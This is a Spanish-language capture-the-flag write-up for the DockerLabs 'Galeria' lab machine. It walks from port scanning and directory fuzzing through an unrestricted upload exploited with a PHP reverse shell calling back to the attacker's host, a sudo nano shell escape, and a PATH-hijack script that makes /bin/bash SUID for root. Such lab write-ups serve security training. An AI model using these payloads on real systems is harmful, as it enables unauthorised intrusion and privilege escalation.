---
icon: flag
---

# Galeria DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip galeria.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh galeria.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 05:52 EDT
Nmap scan report for bicho.dl (172.17.0.2)
Host is up (0.000032s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Gallery
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
```

Veremos solamente un puerto `80` que si entramos veremos que aloja una pagina web con varias imagenes, aparentemente se ve una pagina normal, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/gallery              (Status: 200) [Size: 937]
/server-status        (Status: 403) [Size: 275]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay un directorio llamado `gallery` si entramos dentro veremos un directorio llamado `/uploads` y si volvemos a entrar dentro veremos un directorio y un archivo `PHP` en el cual se pueden subir archivos, vamos a probar a subir un archivo `.php` que contenga una `reverse shell`.

## Escalate user www-data

```
URL = http://<IP>/gallery/uploads/handler.php
```

> webshell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ahora si lo subimos veremos lo siguiente:

```
Archivo subido exitosamente: webshell.php
```

Vemos que no hay que realizar ningun `bypass` de extensiones ni nada, vamos a irnos a la carpeta de `/uploads/images/` y veremos ahi el archivo que hemos subido.

Antes de meternos dentro, nos pondremos a la escucha de la siguiente forma:

```shell
nc -lvnp <PORT>
```

Ahora si nos metemos en el archivo `webshell.php`.

```
URL = http://<IP>/gallery/uploads/images/webshell.php
```

Y si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 51294
whoami
www-data
```

Vemos que hemos obtenido la `shell` como el usuario `www-data` por lo que vamos a sanitizarla.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user gallery

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on 1e028bf352fb:
    env_reset, mail_badpass, use_pty

User www-data may run the following commands on 1e028bf352fb:
    (gallery) NOPASSWD: /bin/nano
    (www-data) NOPASSWD: /bin/nano
```

Vemos que podemos ejecutar `nano` como el usuario `gallery` por lo que haremos lo siguiente:

```shell
sudo -u gallery nano

#Dentro del nano
^R^X
reset; bash 1>&0 2>&0
```

Lo ejecutamos y veremos lo siguiente:

```
gallery@1e028bf352fb:/tmp$ whoami
gallery
```

Veremos que seremos el usuario `gallery`.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for gallery on 1e028bf352fb:
    env_reset, mail_badpass, env_keep+=PATH, use_pty

User gallery may run the following commands on 1e028bf352fb:
    (ALL) NOPASSWD: /usr/local/bin/runme
```

Vemos que podemos ejecutar el binario `runme` como el usuario `root` por lo que vamos a investigar que hace dicho binario.

Vamos a pasarnos el binario a nuestro `host`.

```shell
cd /usr/local/bin/
python3 -m http.server
```

Desde nuestro host:

```shell
wget http://<IP_VICTIM>:8000/runme
```

Una vez que nos lo hayamos pasado, vamos a ejecutar la herramienta llamada `ghidra` para poder decompilar el binario y poder observar como funciona.

```shell
ghidra
```

Una vez abierto crearemos un nuevo proyecto, despues le daremos al icono del dragon de color verde y dentro del mismo vamos a importar un archivo, seleccionaremos el `runme`, una vez importado si nos vamos a `Functions` -> `main` veremos el codigo decompilado.

<figure><img src="../../.gitbook/assets/image (379).png" alt=""><figcaption></figcaption></figure>

Vemos que esta llamando a un `binario`, vamos a probar a llamarlo nosotros en la terminal.

```shell
convert
```

Info:

```
bash: convert: command not found
```

Vemos que no existe dicho `binario` por lo que podremos realizar un `Path Hijacking` vamos a crear nosotros un archivo que se llame `convert` en la `/tmp` y vamos a exportar la variable `PATH` para que vaya primero al archivo que hemos creado cuando ejecutemos el binario.

```shell
cd /tmp
nano convert

#Dentro del nano
#!/bin/bash

echo "Permisos establecidos de forma correcta..."
chmod u+s /bin/bash
```

Lo guardamos y establecemos permisos de ejecuccion.

```shell
chmod +x convert
```

Ahora vamos a `exportar` la variable para que funcione esto:

```shell
export PATH=/tmp:$PATH
```

Echo esto, vamos a ejecutar el binario que podemos ejecutar como el usuario `root`.

```shell
sudo /usr/local/bin/runme
```

Info:

```
Converting image...
Permisos establecidos de forma correcta...
Done.
```

Y veremos que ha funcionado, vamos a listar la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Vemos que se establecio de forma correcta, por lo que haremos lo siguiente para ser el usuario `root`.

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto ya seremos `root` por lo que habremos terminado la maquina.
